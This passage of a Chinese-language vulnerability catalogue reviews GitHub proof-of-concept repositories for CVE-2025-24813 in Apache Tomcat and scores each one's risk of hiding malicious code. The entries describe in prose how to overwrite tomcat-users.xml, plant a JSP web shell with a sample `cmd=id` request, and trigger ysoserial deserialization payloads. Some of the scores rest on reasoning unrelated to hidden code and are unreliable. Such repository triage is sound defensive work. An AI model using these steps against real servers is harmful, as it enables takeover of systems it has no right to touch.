POC 代码本身看起来相对简单，主要执行上传 payload 和触发反序列化操作。仔细检查后，存在以下潜在的投毒风险：

*   **Payload 内容：** 虽然 POC 代码没有直接包含恶意 payload，但是依赖用户提供的 `payload_file`。如果用户从不可信的来源获取了恶意 payload 文件，则可能存在投毒风险。
*   **隐蔽的 HTTP 请求修改：** 在 `requests.put` 或 `requests.get` 调用中，攻击者可能添加额外的 HTTP 头或修改请求内容，以在目标服务器上执行其他恶意操作。目前的代码较为简洁，未发现明显的可疑之处。
*   **依赖库的风险：** `requests` 是一个常用的 Python 库，但如果攻击者篡改了这个库，可能会引入恶意行为。可能性较低，但不能完全排除。
*   **代码逻辑的细微修改：** 攻击者可能会对 POC 代码进行细微修改，例如更改上传路径或触发反序列化的方式，以便在特定环境下实现更隐蔽的攻击。这些修改后的代码可能更难被检测到。

总体而言，此 POC 代码直接包含投毒代码的可能性较低，约 10%。更大的风险在于用户使用的 payload 文件是否可信，以及攻击者是否会对代码进行修改以适应特定环境。


**项目地址:** [fatkz/CVE-2025-24813](https://github.com/fatkz/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #30

**来源**: [CVE-2025-24813-gregk4sec_CVE-2025-24813.md](../2025/CVE-2025-24813-gregk4sec_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价漏洞/反序列化漏洞

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和文件篡改

**影响版本:** 11.0.0-M1 <= version <= 11.0.2
10.1.0-M1 <= version <= 10.1.34
9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足多个条件，包括：Default Servlet 开启写入权限 (默认关闭), 开启 partial PUT (默认开启), 敏感文件位于公开上传目录的子目录, 攻击者已知敏感文件名, 使用 partial PUT 上传敏感文件，或者Tomcat使用文件存储 session 且包含可利用的反序列化库。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2025-24813 是一个 Apache Tomcat 中的路径等价漏洞，攻击者可以通过利用 'file.Name' (内部点) 绕过路径检查，结合 Default Servlet 的写入权限和 partial PUT 功能，实现远程代码执行、信息泄露或恶意内容添加。

**漏洞利用方式分析:**

1.  **信息泄露和文件篡改:**
    *   攻击者利用 partial PUT 功能，将恶意内容写入服务器上的临时文件。
    *   利用路径等价漏洞，使得攻击者可以访问或覆盖位于受保护目录中的文件。
    *   通过精心构造的 partial PUT 请求，攻击者可以读取或修改敏感文件，导致信息泄露或文件篡改。
    *   PoC 代码演示了如何通过 partial PUT 请求，在未授权的情况下读取 secret 目录下的文件内容，实现信息泄露。

2.  **远程代码执行 (RCE):**
    *   如果 Tomcat 使用文件存储 session，攻击者可以将包含恶意序列化对象的 payload 上传到 session 文件中。
    *   当 Tomcat 加载该 session 时，会触发反序列化漏洞，导致远程代码执行。

**投毒风险分析:**

PoC 代码存在很高的投毒风险，原因如下：

1.  **利用条件复杂:** 该漏洞的利用依赖于多个配置条件，例如 Default Servlet 开启写入权限，开启 partial PUT，以及特定的目录结构。攻击者可能需要进行大量的探测和尝试才能找到满足利用条件的目标。
2.  **文件上传:** 该漏洞涉及到文件上传，攻击者可以在上传的文件中嵌入恶意代码，例如 webshell 或其他恶意脚本，从而控制服务器。
3. **Partial PUT 特点:**  Partial PUT 允许攻击者分块上传文件,方便投毒和绕过检查。
4.  **反序列化攻击:** RCE的其中一种方式依赖反序列化漏洞，而反序列化 payload 本身就具有极高的投毒风险。

考虑到这些因素，该漏洞的投毒风险非常高。如果攻击者成功利用该漏洞，可能会对服务器造成严重的损害。

**项目地址:** [gregk4sec/CVE-2025-24813](https://github.com/gregk4sec/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #31

**来源**: [CVE-2025-24813-hakankarabacak_CVE-2025-24813.md](../2025/CVE-2025-24813-hakankarabacak_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径等价/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet的写入已启用；支持Partial PUT；应用程序使用Tomcat基于文件的会话持久性，且使用了默认存储位置；应用程序包含一个可能在反序列化攻击中被利用的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，涉及路径等价问题和潜在的反序列化远程代码执行。根据漏洞库信息，如果满足以下条件，攻击者能够执行远程代码：

*   默认Servlet的写入已启用（默认禁用）。
*   支持Partial PUT（默认启用）。
*   应用程序使用Tomcat基于文件的会话持久性，且使用了默认存储位置。
*   应用程序包含一个可能在反序列化攻击中被利用的库。

根据搜索引擎结果，该漏洞已被积极利用。

提供的 Dockerfile 漏洞利用代码显示：

1.  **开启了`readonly`参数**: 将`readonly`参数设置为`false`，从而启用了默认Servlet的写入功能，这是利用该漏洞的必要条件之一。
2.  **配置了`PersistentManager`**: 添加了 `<Manager className="org.apache.catalina.session.PersistentManager"><Store className="org.apache.catalina.session.FileStore"/></Manager>` 配置，启用了基于文件的会话持久性，这也是 RCE 的条件之一
3.  **部署WAR包**: 将 ROOT.war 部署到 webapps 目录下。这个WAR包很可能包含恶意代码，通过文件上传或者会话反序列化漏洞被执行。

**利用方式：**

该漏洞的利用方式主要依赖于 Partial PUT 功能和路径等价性。攻击者可以利用 Partial PUT 上传恶意文件片段，然后利用路径等价性（例如使用 `file.Name`）绕过安全检查，将恶意代码写入到目标文件或利用反序列化执行任意代码。 如果使用了 session 持久化，且存在可利用的反序列化 gadget，那么可以利用该漏洞进行RCE。

**投毒风险：**

Dockerfile 本身并未直接包含恶意代码，而是通过配置使 Tomcat 处于易受攻击的状态，并部署一个外部 WAR 包（`ROOT.war`）。因此，投毒的风险主要在于 `ROOT.war` 包中是否包含后门或者恶意代码。 风险评估为 10%,主要原因为需要进一步分析war包，才能确认。

**有效性：**

Dockerfile 配置如果部署了恶意war包，则可以证明该POC有效。在满足了所有漏洞利用条件的情况下，该代码可以有效利用 CVE-2025-24813 漏洞，实现远程代码执行。

**项目地址:** [hakankarabacak/CVE-2025-24813](https://github.com/hakankarabacak/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #32

**来源**: [CVE-2025-24813-horsehacks_CVE-2025-24813-checker.md](../2025/CVE-2025-24813-horsehacks_CVE-2025-24813-checker.md)

## CVE-2025-24813-Apache Tomcat-路径等价/反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化漏洞

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足以下条件：
  1. 默认Servlet的写入已启用（默认禁用）。
  2. 支持部分PUT（默认启用）。
  3. 存在安全敏感上传的目标URL，该URL是公共上传目标URL的子目录。
  4. 攻击者知道要上传的安全敏感文件的名称。
  5. 安全敏感文件也通过部分PUT上传。
或者，如果满足以下条件，则恶意用户可以执行远程代码执行：
  1. 默认Servlet的写入已启用（默认禁用）。
  2. 支持部分PUT（默认启用）。
  3. 应用程序正在使用Tomcat的基于文件的会话持久性，并使用默认存储位置。
  4. 应用程序包含一个可以在反序列化攻击中使用的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，结合默认Servlet的写入启用和部分PUT支持，攻击者可以通过构造特殊的上传路径，覆盖或修改服务器上的敏感文件，造成信息泄露或恶意代码执行。该漏洞还涉及反序列化利用链，如果应用程序满足特定条件，攻击者可以利用Tomcat的文件会话管理机制和应用程序中的反序列化漏洞来执行任意代码。

**有效性分析：**

提供的PoC代码通过检查以下几点来验证漏洞的有效性：

1.  **PUT方法允许性：** 检查目标URL是否允许PUT请求，这是利用该漏洞的前提。
2.  **Tomcat版本检测：** 检查目标服务器的Tomcat版本，确认其是否在受影响的范围内。
3.  **写入权限检查：** 尝试在目标URL的/uploads/目录下写入一个JSP文件，以验证是否具有写入权限。

如果以上三个条件都满足，则目标服务器可能存在CVE-2025-24813漏洞。

**投毒风险分析：**

检查了提供的Python脚本，发现它主要用于检测目标服务器是否存在CVE-2025-24813漏洞，脚本尝试上传JSP文件以验证写入权限。因此，存在很小的投毒风险，代码的功能主要是检测和验证漏洞，而非利用漏洞执行恶意操作，上传的JSP payload也是用于验证，而不是直接执行恶意代码. 但是依然存在服务器被动植入后门webshell的风险。

**利用方式：**

根据漏洞描述，利用方式主要包括以下两种：

1.  **信息泄露/文件篡改：**

   *   攻击者通过构造包含`.Name`（内部点）的恶意文件名，利用路径等价性绕过安全检查。
   *   利用部分PUT请求，将恶意内容注入到安全敏感文件中，或者直接覆盖文件。
   *   目标URL需要是公共上传URL的子目录，且攻击者需要知道敏感文件名。

2.  **远程代码执行：**

   *   攻击者需要找到应用程序中可利用的反序列化漏洞。
   *   利用Tomcat的文件会话管理，将包含恶意反序列化payload的文件上传到会话存储目录。
   *   当Tomcat加载会话数据时，触发反序列化，执行任意代码。

成功利用此漏洞需要满足多个条件，包括Tomcat配置、应用程序环境以及攻击者的知识。

**项目地址:** [horsehacks/CVE-2025-24813-checker](https://github.com/horsehacks/CVE-2025-24813-checker)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #33

**来源**: [CVE-2025-24813-iSee857_CVE-2025-24813-PoC.md](../2025/CVE-2025-24813-iSee857_CVE-2025-24813-PoC.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 ~ 11.0.2, 10.1.0-M1 ~ 10.1.34, 9.0.0.M1 ~ 9.0.98

**利用条件:** 默认Servlet写入已启用，支持部分PUT已启用，目标URL是公共上传URL的子目录, 攻击者需要知道上传的安全敏感文件的名称，安全敏感文件也通过部分PUT上传；或者应用程序使用 Tomcat 基于文件的会话持久性，默认存储位置，应用程序包含一个可以在反序列化攻击中使用的库

**POC 可用性:** 是

**投毒风险:** 100%

## 详情

根据漏洞库信息和搜索结果，CVE-2025-24813 涉及 Apache Tomcat 的路径等价问题，可能导致远程代码执行、信息泄露或恶意内容注入。漏洞利用依赖于多个条件，包括默认Servlet写入已启用，支持部分PUT请求，以及特定的文件存储配置。搜索结果 "One PUT Request to Own Tomcat: CVE-2025-24813 RCE is in the Wild/" 表明该漏洞可能已在野外被利用，提高了其风险级别。提供的PoC代码是一个批量检测脚本，通过发送恶意PUT请求来验证目标是否存在漏洞。由于PoC中包含未经审查的base64解码payload, 存在极高的投毒风险，攻击者可能修改payload指向恶意地址，执行任意代码,因此投毒风险为100%。

**利用方式：**
1.  **信息泄露/恶意内容注入：** 如果满足条件 writes enabled for the default servlet, support for partial PUT, a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, the security sensitive files also being uploaded via partial PUT，则可以查看安全敏感文件和/或将内容注入到这些文件中。
2.  **远程代码执行：** 如果满足条件 writes enabled for the default servlet, support for partial PUT, application was using Tomcat's file based session persistence with the default storage location, application included a library that may be leveraged in a deserialization attack，则可利用反序列化漏洞执行远程代码。
3.  **PoC 利用：** PoC脚本首先解析目标URL，然后发送精心构造的PUT请求到目标服务器。如果服务器存在漏洞，并且满足利用条件，攻击者可以实现远程代码执行或信息泄露。

**项目地址:** [iSee857/CVE-2025-24813-PoC](https://github.com/iSee857/CVE-2025-24813-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #34

**来源**: [CVE-2025-24813-imbas007_CVE-2025-24813-apache-tomcat.md](../2025/CVE-2025-24813-imbas007_CVE-2025-24813-apache-tomcat.md)

## CVE-2025-24813-Apache Tomcat Path Equivalence-RCE/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露以及服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要 writes enabled for the default servlet (默认禁用), support for partial PUT (默认启用), application 使用 Tomcat 的基于文件的 session 持久化，默认存储位置, application 包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞。攻击者可以利用此漏洞绕过安全限制，通过精心设计的目录遍历序列覆盖关键配置文件，部署 web shell，并可能实现远程代码执行 (RCE)。

**有效性：**
提供的 Nuclei 模板（CVE-2025-24813.yaml）似乎有效。它包含三个请求：
1.  **PUT 请求覆盖 tomcat-users.xml：** 用于创建一个新的管理员用户，从而允许未经授权的访问。
2.  **PUT 请求部署 JSP Web Shell：** 用于在服务器上部署一个简单的 Web Shell，允许执行任意命令。
3.  **GET 请求执行 `id` 命令：**  用于验证 Web Shell 是否已成功部署并且可以执行命令。

该模板使用匹配器来验证请求是否成功，并提取相关信息。`README.md` 文件还提供了关于如何使用该模板和执行 Web Shell 的说明。

**投毒风险：**
虽然 POC 代码本身的目的在于利用漏洞，但其中潜在的投毒风险较低（约 5%）。风险主要存在于以下几个方面：
1.  **Web Shell 功能：** Web Shell 允许执行任意命令，如果攻击者在测试环境之外使用它，可能会造成恶意行为。虽然提供的 Web Shell 相对简单，但攻击者可以修改它以包含恶意功能，例如下载和执行其他恶意软件。
2.  **配置文件覆盖：** 覆盖 `tomcat-users.xml` 文件虽然是利用漏洞的一部分，但如果攻击者使用恶意配置替换该文件，可能会导致服务器不稳定或更容易受到其他攻击。
3.  **第三方依赖：** Nuclei 模板本身依赖于 Nuclei 工具。如果 Nuclei 工具被篡改，则可能存在其他风险。

总体而言，直接投毒的风险较低，因为代码主要集中在利用已知漏洞上。然而，通过 Web Shell 执行恶意操作的可能性仍然存在。

**利用方式：**
利用 CVE-2025-24813 漏洞的步骤如下：
1.  **利用路径等价漏洞：** 攻击者利用 Tomcat 默认 servlet 处理文件上传时存在的路径等价漏洞。通过在文件名中使用 ".." 序列，攻击者可以绕过目录限制，将文件上传到 Tomcat 配置目录或 Web 应用程序的根目录。
2.  **覆盖 `tomcat-users.xml` 文件：** 攻击者使用 PUT 请求将包含恶意用户的 `tomcat-users.xml` 文件上传到 `../conf/` 目录。此文件覆盖现有的 `tomcat-users.xml` 文件，从而创建一个具有管理员权限的新用户。
3.  **部署 Web Shell：** 攻击者使用 PUT 请求将 JSP Web Shell 文件上传到 Web 应用程序的根目录（`../webapps/ROOT/`）。此 Web Shell 允许攻击者在服务器上执行任意命令。
4.  **执行任意命令：** 攻击者使用浏览器访问 Web Shell 的 URL，并通过 `cmd` 参数执行任意命令。例如，`http://target.com/updates.jsp?cmd=id` 命令将显示服务器的用户 ID 信息。

**需要注意的是，默认情况下，Tomcat 的 default servlet 的写入是禁用的，需要手动启用。** 除此之外，如果启用了基于文件的 session 持久化，并且应用包含了可用于反序列化攻击的库，则可以通过上传恶意的 session 文件来实现 RCE。

攻击者可以通过上传恶意文件，执行任意代码，并完全控制受影响的 Tomcat 服务器。

**项目地址:** [imbas007/CVE-2025-24813-apache-tomcat](https://github.com/imbas007/CVE-2025-24813-apache-tomcat)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #35

**来源**: [CVE-2025-24813-issamjr_CVE-2025-24813-Scanner.md](../2025/CVE-2025-24813-issamjr_CVE-2025-24813-Scanner.md)

## CVE-2025-24813 - Apache Tomcat Path Equivalence / Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 to 9.0.98, 10.1.0-M1 to 10.1.34, 11.0.0-M1 to 11.0.2

**利用条件:** 需要满足多个条件，包括：默认Servlet的写入启用（默认禁用），支持partial PUT（默认启用），特定的目录结构，攻击者需要了解敏感文件名，应用使用Tomcat的文件会话持久性（默认位置）并且包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是Apache Tomcat中的一个高危漏洞，涉及路径等价性（内部点）问题，可能导致远程代码执行（RCE）、信息泄露或恶意内容添加到上传的文件。该漏洞利用了Tomcat对包含内部点的文件名处理不当，结合启用的Default Servlet写入功能和Partial PUT支持。如果攻击者能够满足所有前提条件，则可以上传恶意JSP文件或通过反序列化漏洞执行任意代码。从github仓库提供的python脚本来看，该脚本只是检测是否存在漏洞，并不能实现真正的利用。该仓库存在一定的投毒风险，可能性为10%， 主要体现在作者可能在后续版本中添加恶意代码，例如反弹shell或植入后门等，但当前提供的版本并未发现明显的恶意行为。

**项目地址:** [issamjr/CVE-2025-24813-Scanner](https://github.com/issamjr/CVE-2025-24813-Scanner)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #36

**来源**: [CVE-2025-24813-maliqto_PoC-CVE-2025-24813.md](../2025/CVE-2025-24813-maliqto_PoC-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价和反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** Default Servlet 开启写入 (默认关闭), 支持Partial PUT (默认开启), 应用使用Tomcat的文件Session持久化存储(默认位置), 存在可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个高危漏洞，源于路径等价（Path Equivalence）问题和不安全的反序列化。

**漏洞利用方式：**

1.  **路径等价和信息泄露/恶意内容注入：** 如果 Tomcat 启用了 Default Servlet 的写入功能（`writes enabled for the default servlet`），并支持 partial PUT（`support for partial PUT`），且存在一个安全敏感文件上传的目标 URL 是公共上传 URL 的子目录，攻击者知晓敏感文件名，并使用 partial PUT 上传，则攻击者可能能够查看敏感文件或向其中注入恶意内容。
2.  **反序列化导致远程代码执行：** 如果 Tomcat 启用了 Default Servlet 的写入功能，支持 partial PUT，且应用程序使用了 Tomcat 的基于文件 Session 持久化存储（使用默认存储位置），并且应用程序包含一个可以用于反序列化攻击的库，那么攻击者可能执行远程代码。

**POC 有效性：**

提供的 POC 代码 `poc-cve.py`  是一个 Python 脚本，用于检测和利用 CVE-2025-24813 漏洞。它包含以下功能：

*   检测 Default Servlet 是否可写（通过 PUT 方法）。
*   生成 ysoserial payload 用于反序列化攻击。
*   通过 PUT 方法上传恶意 payload 到 session 文件，从而触发反序列化漏洞。

根据漏洞信息和 POC 代码，此 POC 具备有效性，可以在满足漏洞利用条件的环境中实现远程代码执行。

**投毒风险分析：**

仔细检查了提供的 Python 脚本 `poc-cve.py` 和 `README.md`。代码主要用于生成和上传恶意 payload，利用反序列化漏洞执行命令。以下是风险评估：

*   **高风险部分**  使用了 `ysoserial.jar`，如果下载源被篡改，可能会引入恶意代码。但脚本本身只是调用 `ysoserial.jar`，并没有直接包含恶意逻辑。
*   **潜在风险** 脚本在生成 payload 过程中，如果 `ysoserial.jar`  被替换为恶意版本，或者脚本中的命令注入点被恶意修改，可能导致投毒。
*   **低风险部分**  脚本中包含删除临时文件的函数 `remove_file`，这有助于清理攻击痕迹，本身不属于投毒行为。

综合评估，该仓库存在一定的投毒风险，主要集中在 ysoserial 的依赖和命令注入的可能性上。考虑到代码的整体结构和目的，以及作者声明的教育目的，直接包含恶意代码的可能性较低。风险评估百分比为10%。主要是考虑到使用者可能会误用或在不安全的环境中使用。

**总结：**

CVE-2025-24813 是一个需要多种条件才能触发的漏洞。 POC 实现了漏洞利用，但存在一定的投毒风险，主要是依赖外部工具 `ysoserial` 且需要谨慎使用。


**项目地址:** [maliqto/PoC-CVE-2025-24813](https://github.com/maliqto/PoC-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #37

**来源**: [CVE-2025-24813-manjula-aw_CVE-2025-24813.md](../2025/CVE-2025-24813-manjula-aw_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-RCE/信息泄露/文件篡改

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露和文件篡改

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足以下条件：1. 启用了DefaultServlet的写入功能（默认禁用）；2. 启用了partial PUT支持（默认启用）；3. 对于RCE，需要应用程序使用Tomcat基于文件的会话持久化，并且包含可用于反序列化攻击的库；对于信息泄露和文件篡改，攻击目标URL是公共上传URL的子目录，且攻击者知道要上传的敏感文件名称,并且敏感文件也通过partial PUT上传。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，利用 'file.Name' (Internal Dot) 导致远程代码执行（RCE）和/或信息泄露和/或通过写入启用的 Default Servlet 将恶意内容添加到上传的文件中。根据漏洞描述和搜索结果，此漏洞利用需要特定配置才能成功。利用方式涉及通过 partial PUT 请求上传恶意构造的文件。提供的POC代码包含三个主要脚本：`01-prepare-environment.sh` 用于配置Tomcat环境，包括启用 DefaultServlet 的写入功能、配置会话持久化（RCE所需），以及下载必要的依赖（ysoserial和commons-collections）；`03-test.sh` 用于构造和发送包含恶意payload的PUT请求，使用ysoserial生成payload，利用CommonsCollections5链执行命令 `touch /tmp/pwndtomcat`。漏洞利用的关键在于 `Content-Range` 头部，该头部用于执行 partial PUT 请求，从而允许攻击者利用路径等价漏洞。该脚本通过修改Content-Range头部中的长度字段，来绕过一些安全检查，实现恶意payload的上传和执行。

**有效性：** 提供的POC代码有效，如果目标环境满足漏洞利用的先决条件（启用了DefaultServlet的写入功能，支持partial PUT，以及特定的部署配置），则可以成功利用该漏洞进行RCE或文件篡改/信息泄露。

**投毒风险：** 经过对POC代码的分析，未发现明显的投毒代码。该POC的目的是重现和利用CVE-2025-24813漏洞。脚本的行为符合漏洞利用的预期步骤，没有发现作者隐藏的恶意行为。所有操作都与漏洞利用直接相关。因此，投毒风险评估为0%。

**利用方式：**
1.  **环境准备：** 使用 `01-prepare-environment.sh` 脚本配置Tomcat环境，使其满足漏洞利用的先决条件（例如，启用写入的DefaultServlet，配置基于文件的会话管理）。
2.  **Payload生成：** 使用 `ysoserial` 工具生成恶意序列化 payload。  该 payload 会在目标服务器上执行任意命令。
3.  **Partial PUT 请求：**  使用 `03-test.sh` 脚本，通过精心构造的带有 `Content-Range` 头的 HTTP PUT 请求将 payload 发送到 Tomcat 服务器。 `Content-Range` 头的构造是利用漏洞的关键步骤。 
4.  **RCE/信息泄露/文件篡改：**  如果一切顺利，Tomcat 服务器会反序列化恶意 payload，导致在服务器上执行任意代码（RCE）或修改服务器上的文件，导致信息泄露或文件篡改。

**项目地址:** [manjula-aw/CVE-2025-24813](https://github.com/manjula-aw/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #38

**来源**: [CVE-2025-24813-mbanyamer_Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-.md](../2025/CVE-2025-24813-mbanyamer_Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-.md)

## CVE-2025-24813-Apache Tomcat-RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可完全控制服务器

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 默认Servlet开启写入(disabled by default), 支持Partial PUT(默认开启), 使用Tomcat文件Session持久化默认位置，应用包含可用于反序列化的库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，通过构造包含内部点（例如 file.Name）的文件名，结合启用的默认Servlet写入和部分PUT支持，可能导致远程代码执行和/或信息泄露。POC利用方式如下：

1.  **检查先决条件：** 检查目标Tomcat实例是否满足利用条件：默认Servlet的写入是否开启，Partial PUT是否支持（默认开启），是否使用了基于文件的Session持久化，以及是否包含可利用的反序列化库。
2.  **构造恶意Payload：** 使用 ysoserial 工具生成恶意的序列化 Java Payload，该 Payload 包含要执行的命令。
3.  **上传Payload：** 通过 PUT 请求将Payload上传到Tomcat服务器的Session存储目录。利用路径遍历(../)绕过上传限制，将恶意Session文件上传到 `uploads/../sessions/` 目录下.
4.  **触发反序列化：**  向服务器发送包含特定Session ID的请求，触发Tomcat加载恶意的Session文件，导致反序列化漏洞被触发，执行Payload中的命令。
5. **验证和清理：** 验证命令是否成功执行，并清理上传的恶意Session文件。

**有效性评估：**
根据漏洞库信息、搜索结果以及漏洞利用代码，可以判断该漏洞利用代码是有效的。搜索结果显示该漏洞已被积极利用。

**投毒风险评估：**
仔细分析了提供的POC代码，没有发现作者有意隐藏的投毒代码。代码逻辑清晰，功能明确，主要是利用ysoserial生成payload，然后通过PUT请求上传，最后触发。



**项目地址:** [mbanyamer/Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-](https://github.com/mbanyamer/Apache-Tomcat---Remote-Code-Execution-via-Session-Deserialization-CVE-2025-24813-)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #39

**来源**: [CVE-2025-24813-michael-david-fry_Apache-Tomcat-Vulnerability-POC-CVE-2025-24813.md](../2025/CVE-2025-24813-michael-david-fry_Apache-Tomcat-Vulnerability-POC-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价和反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价 / 反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露或恶意内容注入

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 对于RCE：Default Servlet 开启写入，支持Partial PUT，使用了Tomcat文件session持久化默认位置，存在可利用的反序列化库。对于信息泄露/内容注入：Default Servlet 开启写入，支持Partial PUT，存在敏感文件上传目录是公共上传目录的子目录，攻击者已知敏感文件名，使用Partial PUT上传敏感文件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是Apache Tomcat中的一个漏洞，涉及路径等价（'file.Name' 中的内部点）可能导致远程代码执行 (RCE)、信息泄露，或通过启用写入的默认Servlet向上传的文件添加恶意内容。漏洞存在于多个Tomcat版本：9.0.0.M1到9.0.98，10.1.0-M1到10.1.34，以及11.0.0-M1到11.0.2。

根据漏洞描述，如果Default Servlet启用了写入（默认禁用），支持Partial PUT（默认启用），并且应用程序使用了Tomcat的基于文件的会话持久化以及默认存储位置，同时应用程序包含可用于反序列化攻击的库，则可能导致RCE。另外，如果Default Servlet启用了写入，支持Partial PUT，并且存在安全敏感文件上传的目标URL是公共上传目标URL的子目录，攻击者已知安全敏感文件的名称，并且安全敏感文件也是通过partial PUT上传，攻击者可以查看安全敏感文件或向其中注入内容。

提供的PoC代码 (CVE-2025-24813.py) 旨在执行非侵入性检查，以验证目标服务器是否容易受到攻击。它首先尝试从HTTP Server标头中提取Tomcat版本。然后，它尝试通过HTTP PUT在目标上创建一个名为“CVE-2025-24813-check.txt”的文件，如果成功，则删除该文件。这用于确定DefaultServlet是否已启用写入。最后，它尝试检索会话ID。该脚本接受CSV文件作为输入，并在报告文件中记录所有操作。

**有效性：** 根据搜索结果，CVE-2025-24813已被利用，这表明该漏洞确实存在，并且可以被利用。提供的PoC代码主要用于检测漏洞的存在，而不是直接利用RCE或信息泄露。

**投毒风险：** PoC代码中，主要功能是进行版本检测和判断DefaultServlet是否开启写入权限。在提供的代码片段中，没有明显的恶意代码。但是仍存在一定的风险（估计为10%），例如：

1.  **依赖项风险：** 脚本使用了 `requests` 库，如果该库本身被篡改（例如通过PyPI投毒），可能会引入恶意代码。
2.  **报告文件：**  报告文件可能包含敏感信息，如果报告文件被上传到公共位置，可能导致信息泄露。
3.  **脚本维护者风险：** 如果脚本的维护者受到恶意攻击或者本身就是恶意用户，可能会在后续版本中添加恶意代码。

**利用方式：**

1.  **RCE (远程代码执行):**  攻击者需要满足多个条件，包括Default Servlet开启写入，支持Partial PUT，使用了Tomcat文件session持久化默认位置，存在可利用的反序列化库。攻击者利用Partial PUT上传恶意序列化数据到Tomcat的session文件，从而执行任意代码。
